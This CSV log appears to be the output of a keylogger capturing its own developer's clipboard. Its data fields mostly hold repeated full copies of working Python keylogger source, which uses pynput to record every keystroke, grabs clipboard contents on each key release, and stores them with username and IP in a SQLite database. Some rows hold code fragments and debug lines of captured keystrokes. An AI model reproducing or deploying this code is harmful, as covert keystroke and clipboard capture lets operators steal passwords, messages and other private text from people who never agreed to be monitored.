Timestamp,Username,IP,Data
2024-07-02 09:51:04,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence
import re

# Database setup
DB_FILE = ""keylogs.db""


def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()


# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.alt,
    keyboard.Key.alt_gr,
    keyboard.Key.tab,
    keyboard.Key.caps_lock,
    keyboard.Key.delete,
    keyboard.Key.esc,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
}


def log_buffer():
    global buffer
    if buffer:
        sentence = """".join(buffer)
        sentence = re.sub(r""\s+"", "" "", sentence.replace(""\n"", "" ""))
        log_sentence(sentence)
        buffer = []


def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()
                return

    except Exception as e:
        print(f""Error logging keystroke: {e}"")


def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")


# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
2024-07-02 09:51:22,Toshiba,192.168.100.200,"else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()
                return"
2024-07-02 09:52:02,Toshiba,192.168.100.200,"else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()
                return"
2024-07-02 09:53:21,Toshiba,192.168.100.200,"else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()
                return"
2024-07-02 09:53:34,Toshiba,192.168.100.200,"else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()
                return"
2024-07-02 09:54:19,Toshiba,192.168.100.200,"else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()
                return"
2024-07-02 09:56:10,Toshiba,192.168.100.200,"try:
        if key in modifier_keys:
            return  # Skip logging modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
            log_buffer()  # Log buffer after adding a character
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()  # Log buffer after adding newline
        elif key == keyboard.Key.space:
            buffer.append("" "")
            log_buffer()  # Log buffer after adding space
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            # Handle non-character keys
            buffer.append(str(key))
            log_buffer()  # Log buffer after adding non-character key"
2024-07-02 09:56:22,Toshiba,192.168.100.200,"Keystroke logged: s
Keystroke logged: t
Keystroke logged: t
Keystroke logged: e
Keystroke logged: s
Keystroke logged: t
Keystroke logged: i
Keystroke logged: n
Keystroke logged: g
Keystroke logged:
Keystroke logged: t
Keystroke logged: h
Keystroke logged: e
Keystroke logged:
Keystroke logged: c
Keystroke logged: o
Keystroke logged: d
Keystroke logged: e
Keystroke logged:
Keystroke logged: a
Keystroke logged: f
Keystroke logged: a
Keystroke logged: i
Keystroke logged: n
Keystroke logged:"
2024-07-02 09:57:42,Toshiba,192.168.100.200,"Keystroke logged: s
Keystroke logged: t
Keystroke logged: t
Keystroke logged: e
Keystroke logged: s
Keystroke logged: t
Keystroke logged: i
Keystroke logged: n
Keystroke logged: g
Keystroke logged:
Keystroke logged: t
Keystroke logged: h
Keystroke logged: e
Keystroke logged:
Keystroke logged: c
Keystroke logged: o
Keystroke logged: d
Keystroke logged: e
Keystroke logged:
Keystroke logged: a
Keystroke logged: f
Keystroke logged: a
Keystroke logged: i
Keystroke logged: n
Keystroke logged:"
2024-07-02 09:57:53,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence
import re

# Database setup
DB_FILE = ""keylogs.db""


def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()


# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.alt,
    keyboard.Key.alt_gr,
    keyboard.Key.tab,
    keyboard.Key.caps_lock,
    keyboard.Key.delete,
    keyboard.Key.esc,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
}


def log_buffer():
    global buffer
    if buffer:
        sentence = """".join(buffer)
        sentence = re.sub(r""\s+"", "" "", sentence.replace(""\n"", "" ""))
        log_sentence(sentence)
        buffer = []


def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()

    except Exception as e:
        print(f""Error logging keystroke: {e}"")


def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")


# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
2024-07-02 09:58:58,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence
import re

# Database setup
DB_FILE = ""keylogs.db""


def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()


# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.alt,
    keyboard.Key.alt_gr,
    keyboard.Key.tab,
    keyboard.Key.caps_lock,
    keyboard.Key.delete,
    keyboard.Key.esc,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
}


def log_buffer():
    global buffer
    if buffer:
        sentence = """".join(buffer)
        sentence = re.sub(r""\s+"", "" "", sentence.replace(""\n"", "" ""))
        log_sentence(sentence)
        buffer = []


def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()

    except Exception as e:
        print(f""Error logging keystroke: {e}"")


def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")


# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
2024-07-02 09:59:56,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence
import re

# Database setup
DB_FILE = ""keylogs.db""


def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()


# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.alt,
    keyboard.Key.alt_gr,
    keyboard.Key.tab,
    keyboard.Key.caps_lock,
    keyboard.Key.delete,
    keyboard.Key.esc,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
}


def log_buffer():
    global buffer
    if buffer:
        sentence = """".join(buffer)
        sentence = re.sub(r""\s+"", "" "", sentence.replace(""\n"", "" ""))
        log_sentence(sentence)
        buffer = []


def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()

    except Exception as e:
        print(f""Error logging keystroke: {e}"")


def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")


# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
2024-07-02 10:00:32,Toshiba,192.168.100.200,"import time
from datetime import datetime
from pynput import keyboard
import sqlite3
import pyperclip
from logData.logger import log_clipboard, log_sentence
import re

# Database setup
DB_FILE = ""keylogs.db""


def create_database():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    c.execute(
        """"""
        CREATE TABLE IF NOT EXISTS clipboard_logs (
            timestamp TEXT,
            username TEXT,
            ip TEXT,
            text TEXT
        )
        """"""
    )
    conn.commit()
    conn.close()


# Ensure database is created before any operations
create_database()

buffer = []
last_time = time.time()
modifier_keys = {
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.alt,
    keyboard.Key.alt_gr,
    keyboard.Key.tab,
    keyboard.Key.caps_lock,
    keyboard.Key.delete,
    keyboard.Key.esc,
    keyboard.Key.up,
    keyboard.Key.down,
    keyboard.Key.left,
    keyboard.Key.right,
}


def log_buffer():
    global buffer
    if buffer:
        sentence = """".join(buffer)
        sentence = re.sub(r""\s+"", "" "", sentence.replace(""\n"", "" ""))
        log_sentence(sentence)
        buffer = []


def on_press(key):
    global buffer
    try:
        if key in modifier_keys:
            return  # Do not log modifier keys

        if hasattr(key, ""char"") and key.char is not None:
            buffer.append(key.char)
        elif key == keyboard.Key.enter:
            buffer.append(""\n"")
            log_buffer()
        elif key == keyboard.Key.space:
            buffer.append("" "")
        elif key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        else:
            if key not in modifier_keys:  # Only add non-modifier keys to buffer
                buffer.append(str(key))
                log_buffer()

    except Exception as e:
        print(f""Error logging keystroke: {e}"")


def on_release(key):
    try:
        clipboard_text = pyperclip.paste()
        if clipboard_text:
            log_clipboard(clipboard_text)
    except pyperclip.PyperclipException as e:
        print(f""Error capturing clipboard: {e}"")


# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"
